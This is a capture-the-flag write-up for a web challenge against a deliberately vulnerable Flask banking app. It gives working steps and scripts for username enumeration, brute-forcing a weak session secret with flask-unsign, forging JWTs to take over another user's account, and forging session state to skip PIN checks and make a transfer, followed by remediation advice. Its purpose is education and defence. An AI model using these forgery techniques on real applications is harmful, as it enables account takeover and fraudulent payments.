# CTF Writeup — CAPY-CAPY Bank 1

**Event:** KubSTU CTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `KubSTU{1d0r_b4nk4_d4l_d0stup_k_chuzh1m_sch3t4m}`

---

## Challenge Description

> Our golden client, Mikhail Galankov, has come to us. He says a transfer that he did not make went away from the account. We've been figuring it out for the second week, and frankly, we don't understand how: we have a one-time cryptographic signature for every payment, and before the debit, the bank also asks for a PIN. Mikhail swears that neither PIN nor signature were disclosed to anyone, and we believe him — he's a security professional himself.
>
> So that you can safely dig around, we have set up a separate test segment — a complete copy of our bank, with test money and a handful of users inside. Mikhail's username is the same — `mgalankov@4274`.
>
> **URL:** `http://5.35.88.34`

---

## Reconnaissance

### Step 1 — Enumerate the Application

Initial curl to the main page reveals a Flask/Werkzeug application (Russian-language banking portal). Key observations:

- Auth uses two cookies: `access_token_cookie` (JWT) and `session` (Flask signed session)
- Login endpoint differentiates between wrong password and unknown username:
  - `Неверный пароль` → username exists
  - `Пользователь с логином ... не найден` → username not found
- Confirmed `mgalankov@4274` is a valid user

Registration flow reveals the username generation pattern: first letter of first name + transliterated last name + 4 random digits (e.g., `ttestov@2975`).

### Step 2 — Register a Test Account

```bash
curl -s -X POST http://5.35.88.34/register \
  -d "last_name_ru=Тестов&first_name_ru=Тест&birth_date=1990-01-01\
&driver_license_number=12AB345678&driver_license_issued_by=GIBDD\
&email=nata99@test.com&password=test1234&pin_code=12345678" \
  -c /tmp/capy2.txt -D - -L
```

Generated username: `ttestov@2975`. Login and capture the JWT:

```
Set-Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Step 3 — Identify Flask SECRET_KEY via Cookie Brute Force

The Flask session cookie is signed with a secret key. Using `flask-unsign`:

```bash
pip install flask-unsign
flask-unsign --unsign --cookie '<session_cookie>' --wordlist /tmp/words.txt
```

Wordlist included common secrets. Result:

```
[*] Secret key: facetoface
```

The same secret is used for both Flask session signing **and** JWT HMAC signing.

---

## Exploitation

### Step 4 — Forge JWT to Access Mikhail's Account

With the secret known, forge a JWT with `sub=4` (Mikhail's user ID, discovered by trial) and `username=mgalankov@4274`:

```python
import jwt, time
secret = 'facetoface'
now = int(time.time())
payload = {
    'fresh': False, 'iat': now,
    'jti': 'aaaaaaaa-1234-1234-1234-aaaaaaaaaaaa',
    'type': 'access', 'sub': '4', 'nbf': now,
    'exp': now + 3600, 'username': 'mgalankov@4274'
}
token = jwt.encode(payload, secret, algorithm='HS256')
print(token)
```

Test access to dashboard with forged token:

```bash
curl -s http://5.35.88.34/dashboard \
  -b "access_token_cookie=<FORGED_JWT>"
```

Response confirms: `Привет, mgalankov@4274!` — account number `ACC004`, balance `1,331,480.35 ₽`, and multiple historical transactions to `FLAG_SHOP`.

### Step 5 — Inspect Mikhail's Transaction History

```bash
curl -s http://5.35.88.34/receipt/1906 \
  -b "access_token_cookie=<FORGED_JWT>" | grep -A3 "Токен offer"
```

Found an existing offer token from a previous purchase: `6MjZHrCcebxsRUV44LtTlmJ12mQHVgkI`.

### Step 6 — Analyze the Flag Purchase Flow

The `/flag_shop` page shows a product "Флаг от CTF задания" that requires an **offer token** from a Telegram bot. The `/buy_flag` endpoint leads to a PIN confirmation page with this JS flow:

1. POST `/api/get_signature` with PIN → server returns `{date, time, timestamp, signature}`
2. POST `/transfer` with all transaction fields + the server-issued signature

Testing `/api/get_signature` with a wrong PIN returns `{"error": "Неверный PIN-код"}` — PIN is validated server-side.

### Step 7 — Bypass PIN via Flask Session Forgery

The server stores `pending_signatures` inside the Flask session cookie. Since the secret key is known, forge a session with a fake pre-approved signature:

```python
import time, requests
from flask_unsign import sign

now = int(time.time())
sig = "FAKESIG002"

session_data = {
    "pending_signatures": {
        sig: {
            "amount": "1000.0",
            "description": "Покупка: Флаг от CTF задания",
            "expires_at": now + 7200,
            "issued_at": now,
            "timestamp": now,
            "to_account": "FLAG_SHOP",
            "user_id": 4
        }
    }
}

forged_session = sign(session_data, secret='facetoface')
```

### Step 8 — Get Offer Token from Telegram Bot

The flag shop requires a valid offer token obtainable from `@flagi_and_bagi_for_kubstubot`:

```
/token → Rq8Wyxbk1OCD3MGfFmA8Yta1GmxMJA56
```

### Step 9 — Execute the Transfer (Full Exploit)

```python
import datetime, requests
from flask_unsign import sign
import time

JWT = "<FORGED_JWT>"
now = int(time.time())
sig = "FAKESIG002"

session_data = { "pending_signatures": { sig: {
    "amount": "1000.0",
    "description": "Покупка: Флаг от CTF задания",
    "expires_at": now + 7200, "issued_at": now,
    "timestamp": now, "to_account": "FLAG_SHOP", "user_id": 4
}}}

forged_session = sign(session_data, secret='facetoface')
dt = datetime.datetime.now()

resp = requests.post("http://5.35.88.34/transfer",
    cookies={"access_token_cookie": JWT, "session": forged_session},
    data={
        "to_account": "FLAG_SHOP", "amount": "1000.0",
        "description": "Покупка: Флаг от CTF задания",
        "product_id": "1", "token": "Rq8Wyxbk1OCD3MGfFmA8Yta1GmxMJA56",
        "transaction_date": dt.strftime("%d.%m.%Y"),
        "transaction_time": dt.strftime("%H:%M:%S"),
        "transaction_timestamp": str(now),
        "transaction_signature": sig
    }, allow_redirects=True)
```

Receipt #4720 returned: **Статус: Подтверждено** — transfer successful. The Telegram bot then delivered the flag via `/purchases`.

---

## Flag

```
KubSTU{1d0r_b4nk4_d4l_d0stup_k_chuzh1m_sch3t4m}
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Weak Flask SECRET_KEY** | Key `facetoface` brute-forced from public session cookie using `flask-unsign` |
| 2 | **JWT Secret Reuse** | Same secret used for both Flask session and JWT — forging one breaks the other |
| 3 | **IDOR via JWT Forgery** | No server-side validation of JWT claims against DB — arbitrary `sub` grants access to any account |
| 4 | **PIN Bypass via Session Forgery** | `pending_signatures` stored client-side in signed cookie; forgeable once secret is known |
| 5 | **Business Logic Flaw** | Transfer endpoint trusts forged session state over actual PIN verification |

---

## Remediation

1. **Use a strong, randomly generated SECRET_KEY** — minimum 32 bytes of cryptographic randomness; never use dictionary words
2. **Use separate secrets** for session signing and JWT signing
3. **Validate JWT claims server-side** — always cross-check `sub` against the authenticated session in the database
4. **Never store security-critical state in client cookies** — `pending_signatures` should live server-side (e.g., Redis with TTL), referenced by an opaque ID
5. **Rate-limit and lockout** PIN verification endpoints to prevent brute force

---

## Tools Used

- `curl` — HTTP recon and request crafting
- `flask-unsign` — Flask session cookie brute force and forgery
- `PyJWT` — JWT forging with known secret
- `python-requests` — scripted exploit chain
- Telegram bot `@flagi_and_bagi_for_kubstubot` — offer token generation

---

## Attack Flow

```
Register test account → capture session cookie
          │
          ▼
flask-unsign brute force → SECRET_KEY: "facetoface"
          │
          ▼
Forge JWT (sub=4, username=mgalankov@4274)
          │
          ▼
Access /dashboard as Mikhail → ACC004, FLAG_SHOP history
          │
          ▼
Telegram bot /token → offer token: Rq8Wyxbk1OCD3MGfFmA8Yta1GmxMJA56
          │
          ▼
Forge Flask session with fake pending_signatures (FAKESIG002)
          │
          ▼
POST /transfer with forged JWT + forged session + offer token
          │
          ▼
Receipt #4720 → Статус: Подтверждено
          │
          ▼
Telegram /purchases → KubSTU{1d0r_b4nk4_d4l_d0stup_k_chuzh1m_sch3t4m}
```
